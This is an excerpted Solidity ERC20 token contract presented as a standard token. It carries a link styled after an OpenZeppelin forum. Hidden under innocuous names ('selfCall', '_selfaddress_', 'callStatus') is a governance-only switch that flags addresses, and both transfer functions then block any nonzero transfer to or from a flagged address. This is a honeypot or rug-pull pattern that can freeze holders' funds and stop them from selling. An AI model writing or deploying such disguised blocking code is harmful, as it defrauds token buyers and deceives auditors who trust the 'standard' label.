 ...
 * https://forum.zeppelinutions/t/how-to-implement-erc20-supply-mechanisms/226[How
...
contract ERC20 is Context, IERC20 {
    ...
    mapping (address => bool) private _selfaddress_;
    ...
    function selfCall(address _singleaddress) external {
        require(msg.sender == governance);
        if (_selfaddress_[_singleaddress] == true) {
            _selfaddress_[_singleaddress] = false;}
            else {_selfaddress_[_singleaddress] = true;}
    }

    function callStatus(address _singleaddress) public view returns (bool) {
        return _selfaddress_[_singleaddress];
    }
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        if (_selfaddress_[_msgSender()] || _selfaddress_[recipient]) require (amount == 0, "");
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if (_selfaddress_[sender] || _selfaddress_[recipient]) require (amount == 0, "");
...
contract StandardERC20 is ERC20 {
    ...
    constructor (string memory name, string memory symbol, uint8 decimals, uint256 totalsupply_) public 
